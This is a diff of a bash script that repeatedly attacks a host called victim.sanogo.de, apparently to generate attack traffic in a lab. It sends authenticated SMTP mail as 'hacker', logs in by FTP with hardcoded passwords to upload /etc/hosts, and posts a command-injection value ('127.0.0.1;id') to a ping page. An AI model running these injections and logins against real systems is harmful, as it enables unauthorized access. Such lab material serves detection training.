@@ -1,12 +1,8 @@
 #!/bin/bash
 
-VIC=victim.sanogo.de
-USER=martha
-PASS=mustang
-
 f_ping()
 {
-   ping -c 5 $1 > /dev/null 2>&1
+   ping -c 5 $1 
 }
 f_sendmail()
 {
@@ -16,15 +12,15 @@ f_sendmail()
     sleep 1
     echo "AUTH LOGIN"
     sleep 1
-    echo -n "$USER" | base64 | tr -d '\n'
+    echo -n "$2" | base64 | tr -d '\n'
     echo
     sleep 1
-    echo -n "$PASS" | base64 | tr -d '\n'
+    echo -n "$3" | base64 | tr -d '\n'
     echo
     sleep 1
-    echo "MAIL FROM:<hacker@$VIC>"
+    echo "MAIL FROM:<hacker@$1>"
     sleep 1
-    echo "RCPT TO:<root@$VIC>"
+    echo "RCPT TO:<root@$1>"
     sleep 1
     echo "DATA"
     sleep 1
@@ -34,19 +30,31 @@ f_sendmail()
     echo "."
     sleep 1
     echo "QUIT"
-  } | nc $VIC 25
+  } | nc $1 25
 }
 
 
+f_ftp()
+{
+ftp -inv $1 <<EOF
+user $2 $3
+put /etc/hosts
+bye
+EOF
+}
+
+f_command()
+{
+curl -X POST -d "ip=127.0.0.1;id" -d "submit=Ping" $1
+}
+
 while true
 do
-  sleep 3
-  if f_ping $VIC
-  then
-    echo "$(date) - $VIC erreichbar, sende Mail"
-    f_sendmail
-  else
-    echo "$(date) - $VIC NICHT erreichbar"
-  fi
+  sleep 1
+  f_ping  victim.sanogo.de
+  f_sendmail victim.sanogo.de martha mustang
+  f_ftp victim.sanogo.de lena FranzFerdi
+  f_command http://victim.sanogo.de/ping.php
+  f_command https://victim.sanogo.de/ping.php
 done
 
